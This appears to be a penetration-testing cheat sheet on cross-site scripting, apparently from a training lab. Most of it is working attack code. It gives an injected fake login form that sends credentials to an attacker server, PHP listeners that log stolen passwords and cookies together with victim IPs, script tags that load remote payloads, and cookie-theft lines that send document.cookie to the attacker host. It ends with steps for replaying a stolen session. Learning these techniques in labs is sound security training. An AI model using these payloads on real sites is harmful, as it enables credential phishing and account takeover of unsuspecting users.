-----
# Discover XSS
-----
- There are 3 tools for discovery: [XSSStrike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS),[XSSer](https://github.com/epsylon/xsser)

---
# PHISHING with XSS
-----
- We can direct users to a fake log in form and gather their credentials
- Login Form Injection
```html
<h3>Please login to continue</h3>
<form action=http://$PWNBOX>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
- Prepare XSS cod to test on the vulnerable form. 
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
- Deliver the payload to the vulnerable parameter.
- Setup a PHP server on PWNBOX to retrieve information
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo nano index.php
sudo php -S 0.0.0.0:80
```
- Index.php
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

-----
# Hijacking Session
-----
- For login forms, we can send scripts to the fields to see which field is vulnerable
```bash
<script src="http://$PWNBOX/username"></script> #username field
<script src="http://$PWNBOX/fullname"></script> #fullname field
```
- Explore and try different variations of payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
- On PWNBOX, set up PHP server listener:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```
- Whatever response we receive on PWNBOX indicates that field is vulnerable.

### Prepare a payload
- nano script.js
```javascript
# We can use either one of these:
document.location='http://PWNBOX/index.php?c='+document.cookie;
new Image().src='http://PWNBOX/index.php?c='+document.cookie;
```
- Sometimes, there may be more than 1 cookie value are discovered. We set up the following index.php to capture all of them and store them in cookies.txt
```php
# Index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
- Deliver payload
```html
<script src="http://$PWNBOX/script.js"></script>
```
- Once we get the cookie value, we can get to the log in page, add the cookie to the session via Storage tab to log in.